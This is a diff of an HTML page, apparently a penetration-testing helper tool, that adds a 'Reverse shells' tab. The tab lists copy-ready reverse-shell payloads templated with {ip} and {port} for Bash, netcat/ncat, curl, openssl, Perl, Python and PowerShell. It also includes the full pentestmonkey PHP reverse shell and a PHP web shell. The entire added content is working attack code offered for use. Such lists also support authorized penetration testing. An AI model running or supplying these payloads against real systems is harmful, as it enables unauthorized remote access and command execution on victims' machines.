@@ -824,7 +824,7 @@
                             <a class="nav-link" id="shell-assistant-PL-tab" data-bs-toggle="tab"
                                href="#shell-assistant-general-content" role="tab">
                                 <img data-bs-toggle="tooltip"
-                                     data-bs-placement="right" title="Programming language shells"
+                                     data-bs-placement="right" title="Reverse shells"
                                      src="assets/icons/navbar/tab-4-shell-assistant/shell.png"
                                      width="25px" height="25px;">
                             </a>
@@ -849,10 +849,10 @@
                              id="shell-assistant-general-content"
                              role="tabpanel" style="height: 485px">
                             <div class="d-flex flex-column justify-content-between h-100">
-
+                                <h4 class="mt-1">Reverse shells (no MSF)</h4>
                                 <!-- local IP and PORT START-->
-                                <div class="form-group d-flex justify-content-between mt-2">
-                                    <div class="position-relative d-flex w-50 me-1">
+                                <div class="form-group d-flex justify-content-between">
+                                    <div class="position-relative d-flex w-50">
                                         <textarea
                                                 class="form-control"
                                                 rows="1"
@@ -889,26 +889,162 @@
                                 <!-- local IP and PORT END-->
 
                                 <!-- shell assistant input search START-->
-                                <div class="form-group w-100">
+                                <div class="form-group w-100 mt-1 mb-1">
                                     <input class="form-control w-100" id="shell-assistant-input-search" type="text"
                                            placeholder="Search..."/>
                                 </div>
                                 <!-- shell assistant input search END-->
 
-                                <ul id="shell-assistant-shell-list-general"
-                                    class="shell-assistant-shell-list list-unstyled text-start h-75">
+                                <ul id="shell-assistant-shell-list-general" class="list-unstyled text-start h-75" style="overflow-y: scroll">
                                     <li>
-                                        <h6>Bash - TCP</h6>
-                                        <div class="position-relative" style="width: 100%;">
-                                            <pre style="white-space: pre-wrap; width: 100%; z-index: 0;" class="rounded shell-assistant-code-element-pre"><code class="language-bash rounded p-2" data-shell-assistant-original-code-value="bash -i >& /dev/tcp/{ip}/{port} 0>&1"></code></pre>
-                                            <a href="#">
-                                                <img class="copy-icon-white"
-                                                     src="assets/icons/general/copy-white.png"
-                                                     style="position: absolute; bottom: 5px; right: 5px; z-index:10;"
-                                                     height="25px"
-                                                     width="25px"
-                                                     alt="Copy">
-                                            </a>
+                                        <span>Bash reverse TCP shell (Linux/Unix)</span>
+                                        <div style="max-height: 150px; overflow-y: scroll;">
+                                            <pre style="white-space: pre-wrap; width: 100%; position: relative;" class="rounded shell-assistant-code-element-pre border border-primary h-100"><code style="width: 100%;" class="language-bash rounded p-2 pe-5" data-shell-assistant-original-code-value="bash -i >& /dev/tcp/{ip}/{port} 0>&1"></code><a href="#" style="position: absolute; top: 5px; right: 5px;"><img class="copy-icon-white" src="assets/icons/general/copy-white.png" height="25px" width="25px" alt="Copy"></a></pre>
+                                        </div>
+                                    </li>
+                                    <li>
+                                        <span>Bash reverse TCP shell (Linux/Unix, Bash 4.0+)</span>
+                                        <div style="max-height: 150px; overflow-y: scroll;">
+                                            <pre style="white-space: pre-wrap; width: 100%; position: relative;" class="rounded shell-assistant-code-element-pre"><code class="language-bash rounded p-2 pe-5" data-shell-assistant-original-code-value="0<&196;exec 196<>/dev/tcp/{ip}/{port}; bash <&196 >&196 2>&196"></code><a href="#" style="position: absolute; top: 5px; right: 5px;"><img class="copy-icon-white" src="assets/icons/general/copy-white.png" height="25px" width="25px" alt="Copy"></a></pre>
+                                        </div>
+                                    </li>
+                                    <li>
+                                        <span>Bash reverse TCP shell (Linux/Unix)</span>
+                                        <div style="max-height: 150px; overflow-y: scroll;">
+                                            <pre style="white-space: pre-wrap; width: 100%; position: relative;" class="rounded shell-assistant-code-element-pre"><code class="language-bash rounded p-2 pe-5" data-shell-assistant-original-code-value="exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done"></code><a href="#" style="position: absolute; top: 5px; right: 5px;"><img class="copy-icon-white" src="assets/icons/general/copy-white.png" height="25px" width="25px" alt="Copy"></a></pre>
+                                        </div>
+                                    </li>
+                                    <li>
+                                        <span>Bash reverse TCP shell (Linux/Unix)</span>
+                                        <div style="max-height: 150px; overflow-y: scroll;">
+                                            <pre style="white-space: pre-wrap; width: 100%; position: relative;" class="rounded shell-assistant-code-element-pre"><code class="language-bash rounded p-2 pe-5" data-shell-assistant-original-code-value="bash -i 5<> /dev/tcp/{ip}/{port} 0<&5 1>&5 2>&5"></code><a href="#" style="position: absolute; top: 5px; right: 5px;"><img class="copy-icon-white" src="assets/icons/general/copy-white.png" height="25px" width="25px" alt="Copy"></a></pre>
+                                        </div>
+                                    </li>
+                                    <li>
+                                        <span>Bash reverse UDP shell (Linux/Unix)</span>
+                                        <div style="max-height: 150px; overflow-y: scroll;">
+                                            <pre style="white-space: pre-wrap; width: 100%; position: relative;" class="rounded shell-assistant-code-element-pre"><code class="language-bash rounded p-2 pe-5" data-shell-assistant-original-code-value="bash -i >& /dev/udp/{ip}/{port} 0>&1"></code><a href="#" style="position: absolute; top: 5px; right: 5px;"><img class="copy-icon-white" src="assets/icons/general/copy-white.png" height="25px" width="25px" alt="Copy"></a></pre>
+                                        </div>
+                                    </li>
+                                    <li>
+                                        <span>Bash reverse TCP shell using mkfifo and nc (Linux/Unix)</span>
+                                        <div style="max-height: 150px; overflow-y: scroll;">
+                                            <pre style="white-space: pre-wrap; width: 100%; position: relative;" class="rounded shell-assistant-code-element-pre"><code class="language-bash rounded p-2 pe-5" data-shell-assistant-original-code-value="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {ip} {port} >/tmp/f"></code><a href="#" style="position: absolute; top: 5px; right: 5px;"><img class="copy-icon-white" src="assets/icons/general/copy-white.png" height="25px" width="25px" alt="Copy"></a></pre>
+                                        </div>
+                                    </li>
+                                    <li>
+                                        <span>Netcat reverse TCP shell (Linux/Unix)</span>
+                                        <div style="max-height: 150px; overflow-y: scroll;">
+                                            <pre style="white-space: pre-wrap; width: 100%; position: relative;" class="rounded shell-assistant-code-element-pre"><code class="language-bash rounded p-2 pe-5" data-shell-assistant-original-code-value="nc {ip} {port} -e bash"></code><a href="#" style="position: absolute; top: 5px; right: 5px;"><img class="copy-icon-white" src="assets/icons/general/copy-white.png" height="25px" width="25px" alt="Copy"></a></pre>
+                                        </div>
+                                    </li>
+                                    <li>
+                                        <span>Netcat reverse TCP shell (Windows, nc.exe)</span>
+                                        <div style="max-height: 150px; overflow-y: scroll;">
+                                            <pre style="white-space: pre-wrap; width: 100%; position: relative;" class="rounded shell-assistant-code-element-pre"><code class="language-bash rounded p-2 pe-5" data-shell-assistant-original-code-value="nc.exe {ip} {port} -e bash"></code><a href="#" style="position: absolute; top: 5px; right: 5px;"><img class="copy-icon-white" src="assets/icons/general/copy-white.png" height="25px" width="25px" alt="Copy"></a></pre>
+                                        </div>
+                                    </li>
+                                    <li>
+                                        <span>Netcat reverse TCP shell with -c option (Linux/Unix)</span>
+                                        <div style="max-height: 150px; overflow-y: scroll;">
+                                            <pre style="white-space: pre-wrap; width: 100%; position: relative;" class="rounded shell-assistant-code-element-pre"><code class="language-bash rounded p-2 pe-5" data-shell-assistant-original-code-value="nc -c bash {ip} {port}"></code><a href="#" style="position: absolute; top: 5px; right: 5px;"><img class="copy-icon-white" src="assets/icons/general/copy-white.png" height="25px" width="25px" alt="Copy"></a></pre>
+                                        </div>
+                                    </li>
+                                    <li>
+                                        <span>Ncat reverse TCP shell (Linux/Unix)</span>
+                                        <div style="max-height: 150px; overflow-y: scroll;">
+                                            <pre style="white-space: pre-wrap; width: 100%; position: relative;" class="rounded shell-assistant-code-element-pre"><code class="language-bash rounded p-2 pe-5" data-shell-assistant-original-code-value="ncat {ip} {port} -e bash"></code><a href="#" style="position: absolute; top: 5px; right: 5px;"><img class="copy-icon-white" src="assets/icons/general/copy-white.png" height="25px" width="25px" alt="Copy"></a></pre>
+                                        </div>
+                                    </li>
+                                    <li>
+                                        <span>Ncat reverse TCP shell (Windows, ncat.exe)</span>
+                                        <div style="max-height: 150px; overflow-y: scroll;">
+                                            <pre style="white-space: pre-wrap; width: 100%; position: relative;" class="rounded shell-assistant-code-element-pre"><code class="language-bash rounded p-2 pe-5" data-shell-assistant-original-code-value="ncat.exe {ip} {port} -e bash"></code><a href="#" style="position: absolute; top: 5px; right: 5px;"><img class="copy-icon-white" src="assets/icons/general/copy-white.png" height="25px" width="25px" alt="Copy"></a></pre>
+                                        </div>
+                                    </li>
+                                    <li>
+                                        <span>Bash reverse UDP shell using mkfifo and ncat (Linux/Unix)</span>
+                                        <div style="max-height: 150px; overflow-y: scroll;">
+                                            <pre style="white-space: pre-wrap; width: 100%; position: relative;" class="rounded shell-assistant-code-element-pre"><code class="language-bash rounded p-2 pe-5" data-shell-assistant-original-code-value="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|ncat -u {ip} {port} >/tmp/f"></code><a href="#" style="position: absolute; top: 5px; right: 5px;"><img class="copy-icon-white" src="assets/icons/general/copy-white.png" height="25px" width="25px" alt="Copy"></a></pre>
+                                        </div>
+                                    </li>
+
+                                    <li>
+                                        <span>Reverse shell using curl (Linux/Unix)</span>
+                                        <div style="max-height: 150px; overflow-y: scroll;">
+                                            <pre style="white-space: pre-wrap; width: 100%; position: relative;" class="rounded shell-assistant-code-element-pre"><code class="language-bash rounded p-2 pe-5" data-shell-assistant-original-code-value="C='curl -Ns telnet://{ip}:{port}'; $C </dev/null 2>&1 | bash 2>&1 | $C >/dev/null"></code><a href="#" style="position: absolute; top: 5px; right: 5px;"><img class="copy-icon-white" src="assets/icons/general/copy-white.png" height="25px" width="25px" alt="Copy"></a></pre>
+                                        </div>
+                                    </li>
+                                    <li>
+                                        <span>Bash reverse shell using openssl (Linux/Unix)</span>
+                                        <div style="max-height: 150px; overflow-y: scroll;">
+                                            <pre style="white-space: pre-wrap; width: 100%; position: relative;" class="rounded shell-assistant-code-element-pre"><code class="language-bash rounded p-2 pe-5" data-shell-assistant-original-code-value="mkfifo /tmp/s; bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ip}:{port} > /tmp/s; rm /tmp/s"></code><a href="#" style="position: absolute; top: 5px; right: 5px;"><img class="copy-icon-white" src="assets/icons/general/copy-white.png" height="25px" width="25px" alt="Copy"></a></pre>
+                                        </div>
+                                    </li>
+                                    <li>
+                                        <span>Perl reverse TCP shell (Linux/Unix)</span>
+                                        <div style="max-height: 150px; overflow-y: scroll;">
+                                            <pre style="white-space: pre-wrap; width: 100%; position: relative;" class="rounded shell-assistant-code-element-pre"><code class="language-perl rounded p-2 pe-5" data-shell-assistant-original-code-value="perl -e 'use Socket;$i=&quot;{ip}&quot;;$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;>&S&quot;);open(STDOUT,&quot;>&S&quot;);open(STDERR,&quot;>&S&quot;);exec(&quot;bash -i&quot;);};'"></code><a href="#" style="position: absolute; top: 5px; right: 5px;"><img class="copy-icon-white" src="assets/icons/general/copy-white.png" height="25px" width="25px" alt="Copy"></a></pre>
+                                        </div>
+                                    </li>
+                                    <li>
+                                        <span>Perl reverse TCP shell using IO::Socket::INET (Linux/Unix)</span>
+                                        <div style="max-height: 150px; overflow-y: scroll;">
+                                            <pre style="white-space: pre-wrap; width: 100%; position: relative;" class="rounded shell-assistant-code-element-pre"><code class="language-perl rounded p-2 pe-5" data-shell-assistant-original-code-value="perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&quot;{ip}:{port}&quot;);STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"></code><a href="#" style="position: absolute; top: 5px; right: 5px;"><img class="copy-icon-white" src="assets/icons/general/copy-white.png" height="25px" width="25px" alt="Copy"></a></pre>
+                                        </div>
+                                    </li>
+                                    <li>
+                                        <span>PHP reverse shell - pentestmonkey - (Linux/Unix)</span>
+                                        <div style="max-height: 150px; overflow-y: scroll;">
+                                            <pre style="white-space: pre-wrap; width: 100%; position: relative;" class="rounded shell-assistant-code-element-pre"><code class="language-php rounded p-2 pe-5" data-shell-assistant-original-code-value="<?php set_time_limit (0); $VERSION = &quot;1.0&quot;; $ip = '{ip}'; $port = {port}; $chunk_size = 1400; $write_a = null; $error_a = null; $shell = 'uname -a; w; id; bash -i'; $daemon = 0; $debug = 0; if (function_exists('pcntl_fork')) { $pid = pcntl_fork(); if ($pid == -1) { printit(&quot;ERROR: Can't fork&quot;); exit(1); } if ($pid) { exit(0); } if (posix_setsid() == -1) { printit(&quot;Error: Can't setsid()&quot;); exit(1); } $daemon = 1; } else { printit(&quot;WARNING: Failed to daemonise. This is quite common and not fatal.&quot;); } chdir(&quot;/&quot;); umask(0); $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) { printit(&quot;$errstr ($errno)&quot;); exit(1); } $descriptorspec = array( 0 => array(&quot;pipe&quot;, &quot;r&quot;), 1 => array(&quot;pipe&quot;, &quot;w&quot;), 2 => array(&quot;pipe&quot;, &quot;w&quot;) ); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) { printit(&quot;ERROR: Can't spawn shell&quot;); exit(1); } stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit(&quot;Successfully opened reverse shell to $ip:$port&quot;); while (1) { if (feof($sock)) { printit(&quot;ERROR: Shell connection terminated&quot;); break; } if (feof($pipes[1])) { printit(&quot;ERROR: Shell process terminated&quot;); break; } $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); if (in_array($sock, $read_a)) { if ($debug) printit(&quot;SOCK READ&quot;); $input = fread($sock, $chunk_size); if ($debug) printit(&quot;SOCK: $input&quot;); fwrite($pipes[0], $input); } if (in_array($pipes[1], $read_a)) { if ($debug) printit(&quot;STDOUT READ&quot;); $input = fread($pipes[1], $chunk_size); if ($debug) printit(&quot;STDOUT: $input&quot;); fwrite($sock, $input); } if (in_array($pipes[2], $read_a)) { if ($debug) printit(&quot;STDERR READ&quot;); $input = fread($pipes[2], $chunk_size); if ($debug) printit(&quot;STDERR: $input&quot;); fwrite($sock, $input); } } fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); function printit ($string) { if (!$daemon) { print &quot;$string\n&quot;; } } ?>"></code><a href="#" style="position: absolute; top: 5px; right: 5px;"><img class="copy-icon-white" src="assets/icons/general/copy-white.png" height="25px" width="25px" alt="Copy"></a></pre>
+                                        </div>
+                                    </li>
+                                    <li>
+                                        <span>PHP web shell (Linux/Unix && Windows)</span>
+                                        <div style="max-height: 150px; overflow-y: scroll;">
+                                            <pre style="white-space: pre-wrap; width: 100%; position: relative;" class="rounded shell-assistant-code-element-pre"><code class="language-php rounded p-2 pe-5" data-shell-assistant-original-code-value="&lt;html&gt; &lt;/html&gt; &lt;?php if (isset($_REQUEST['HYBY7F2D5Ak6gSr8Ng5o'])){ echo &quot;&lt;pre&gt;&quot;.shell_exec($_GET['HYBY7F2D5Ak6gSr8Ng5o']).&quot;&lt;/pre&gt;&quot;; }; if (isset($_REQUEST['iqm9fi3UekCmw1c85ChG'])){ echo &quot;&lt;pre&gt;&quot;.system($_GET['iqm9fi3UekCmw1c85ChG']).&quot;&lt;/pre&gt;&quot;; }; if (isset($_REQUEST['S1UhridAs756NB8qb8O1'])){ echo &quot;&lt;pre&gt;&quot;.passthru($_GET['S1UhridAs756NB8qb8O1']).&quot;&lt;/pre&gt;&quot;; }; if (isset($_REQUEST['exec'])){ echo &quot;&lt;pre&gt;&quot;.exec($_GET['exec']).&quot;&lt;/pre&gt;&quot;; }; ?&gt;"></code><a href="#" style="position: absolute; top: 5px; right: 5px;"><img class="copy-icon-white" src="assets/icons/general/copy-white.png" height="25px" width="25px" alt="Copy"></a></pre>
+                                        </div>
+                                    </li>
+                                    <li>
+                                        <span>PowerShell reverse TCP shell (Windows, PowerShell 2.0+)</span>
+                                        <div style="max-height: 150px; overflow-y: scroll;">
+                                            <pre style="white-space: pre-wrap; width: 100%; position: relative;" class="rounded shell-assistant-code-element-pre"><code class="language-powershell rounded p-2 pe-5" data-shell-assistant-original-code-value="$LHOST = &quot;{ip}&quot;; $LPORT = {port}; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2&gt;&amp;1 } catch { $_ }; $StreamWriter.Write(&quot;$Output`n&quot;); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()"></code><a href="#" style="position: absolute; top: 5px; right: 5px;"><img class="copy-icon-white" src="assets/icons/general/copy-white.png" height="25px" width="25px" alt="Copy"></a></pre>
+                                        </div>
+                                    </li>
+                                    <li>
+                                        <span>PowerShell reverse TCP shell (Windows, PowerShell 2.0+)</span>
+                                        <div style="max-height: 150px; overflow-y: scroll;">
+                                            <pre style="white-space: pre-wrap; width: 100%; position: relative;" class="rounded shell-assistant-code-element-pre"><code class="language-powershell rounded p-2 pe-5" data-shell-assistant-original-code-value="powershell -nop -c &quot;$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()&quot;"></code><a href="#" style="position: absolute; top: 5px; right: 5px;"><img class="copy-icon-white" src="assets/icons/general/copy-white.png" height="25px" width="25px" alt="Copy"></a></pre>
+                                        </div>
+                                    </li>
+                                    <li>
+                                        <span>PowerShell reverse TCP shell (Windows, PowerShell 3.0+)</span>
+                                        <div style="max-height: 150px; overflow-y: scroll;">
+                                            <pre style="white-space: pre-wrap; width: 100%; position: relative;" class="rounded shell-assistant-code-element-pre"><code class="language-powershell rounded p-2 pe-5" data-shell-assistant-original-code-value="powershell -nop -W hidden -noni -ep bypass -c &quot;$TCPClient = New-Object Net.Sockets.TCPClient('{ip}', {port});$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL&gt; ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2&gt;&amp;1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()&quot;"></code><a href="#" style="position: absolute; top: 5px; right: 5px;"><img class="copy-icon-white" src="assets/icons/general/copy-white.png" height="25px" width="25px" alt="Copy"></a></pre>
+                                        </div>
+                                    </li>
+                                    <li>
+                                        <span>Python3 reverse TCP shell (Linux/Unix, Python 3.0+)</span>
+                                        <div style="max-height: 150px; overflow-y: scroll;">
+                                            <pre style="white-space: pre-wrap; width: 100%; position: relative;" class="rounded shell-assistant-code-element-pre"><code class="language-python rounded p-2 pe-5" data-shell-assistant-original-code-value="export RHOST=&quot;{ip}&quot;;export RPORT={port};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(&quot;RHOST&quot;),int(os.getenv(&quot;RPORT&quot;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(&quot;bash&quot;)'"></code><a href="#" style="position: absolute; top: 5px; right: 5px;"><img class="copy-icon-white" src="assets/icons/general/copy-white.png" height="25px" width="25px" alt="Copy"></a></pre>
+                                        </div>
+                                    </li>
+                                    <li>
+                                        <span>Python3 reverse TCP shell (Linux/Unix, Python 3.0+)</span>
+                                        <div style="max-height: 150px; overflow-y: scroll;">
+                                            <pre style="white-space: pre-wrap; width: 100%; position: relative;" class="rounded shell-assistant-code-element-pre"><code class="language-python rounded p-2 pe-5" data-shell-assistant-original-code-value="python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(&quot;{ip}&quot;,{port});os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;bash&quot;)'"></code><a href="#" style="position: absolute; top: 5px; right: 5px;"><img class="copy-icon-white" src="assets/icons/general/copy-white.png" height="25px" width="25px" alt="Copy"></a></pre>
+                                        </div>
+                                    </li>
+                                    <li>
+                                        <span>Python3 reverse TCP shell with threading (Windows/Linux/Unix, Python 3.0+)</span>
+                                        <div style="max-height: 150px; overflow-y: scroll;">
+                                            <pre style="white-space: pre-wrap; width: 100%; position: relative;" class="rounded shell-assistant-code-element-pre"><code class="language-python rounded p-2 pe-5" data-shell-assistant-original-code-value="import os,socket,subprocess,threading; def s2p(s, p): while True: data = s.recv(1024) if len(data) > 0: p.stdin.write(data) p.stdin.flush() def p2s(s, p): while True: s.send(p.stdout.read(1)) s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((&quot;{ip}&quot;,{port})) p=subprocess.Popen([&quot;bash&quot;], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE) s2p_thread = threading.Thread(target=s2p, args=[s, p]) s2p_thread.daemon = True s2p_thread.start() p2s_thread = threading.Thread(target=p2s, args=[s, p]) p2s_thread.daemon = True p2s_thread.start() try: p.wait() except KeyboardInterrupt: s.close()"></code><a href="#" style="position: absolute; top: 5px; right: 5px;"><img class="copy-icon-white" src="assets/icons/general/copy-white.png" height="25px" width="25px" alt="Copy"></a></pre>
+                                        </div>
+                                    </li>
+                                    <li>
+                                        <span>Python3 reverse TCP shell (Linux/Unix, Python 3.0+)</span>
+                                        <div style="max-height: 150px; overflow-y: scroll;">
+                                            <pre style="white-space: pre-wrap; width: 100%; position: relative;" class="rounded shell-assistant-code-element-pre"><code class="language-python rounded p-2 pe-5" data-shell-assistant-original-code-value="python3 -c 'import os,pty,socket;s=socket.socket();s.connect((&quot;{ip}&quot;,{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(&quot;bash&quot;)'"></code><a href="#" style="position: absolute; top: 5px; right: 5px;"><img class="copy-icon-white" src="assets/icons/general/copy-white.png" height="25px" width="25px" alt="Copy"></a></pre>
                                         </div>
                                     </li>
                                 </ul>
